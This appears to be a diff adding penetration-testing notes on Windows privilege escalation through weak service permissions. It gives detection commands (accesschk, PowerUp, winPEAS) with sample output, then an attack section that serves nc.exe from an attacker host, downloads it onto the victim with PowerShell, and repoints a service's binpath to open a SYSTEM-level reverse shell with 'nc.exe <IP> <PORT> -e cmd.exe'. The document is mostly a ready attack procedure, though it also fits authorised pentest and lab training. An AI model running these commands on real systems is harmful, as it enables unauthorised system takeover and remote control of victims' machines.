@@ -1,0 +1,48 @@
+# Weak service permission
+# Detection
+# Find all services authenticated users have modify access onto
+accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+#if SERVICE_ALL_ACCESS then vulnerable
+
+# Find all weak folder permissions per drive.
+accesschk.exe /accepteula -uwdqs Users c:\
+accesschk.exe /accepteula -uwdqs "Authenticated Users" c:\
+
+# Find all weak file permissions per drive.
+accesschk.exe /accepteula -uwqs Users c:\*.*
+accesschk.exe /accepteula -uwqs "Authenticated Users" c:\*.*
+
+# or
+
+powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
+# [*] Checking service permissions...
+# 
+# ServiceName   : daclsvc
+# Path          : "C:\Program Files\DACL Service\daclservice.exe"
+# StartName     : LocalSystem
+# AbuseFunction : Invoke-ServiceAbuse -Name 'daclsvc'
+# CanRestart    : True
+
+# or
+
+winPEAS.exe
+# [+] Interesting Services -non Microsoft-(T1007)
+#
+# daclsvc(DACL Service)["C:\Program Files\DACL Service\daclservice.exe"] - Manual - Stopped
+#	YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles
+#
+# [+] Modifiable Services(T1007)
+#	LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
+#	daclsvc: WriteData/CreateFiles
+
+# Exploitation
+# Attacker
+sudo python -m SimpleHTTPServer 80
+sudo nc -lvp <PORT>
+
+# Victim
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/nc.exe', '.\nc.exe')
+sc config <SERVICENAME> binpath= "<PATH>\nc.exe <IP> <PORT> -e cmd.exe"
+sc start <SERVICENAME>
+# or 
+net start <SERVICENAME>
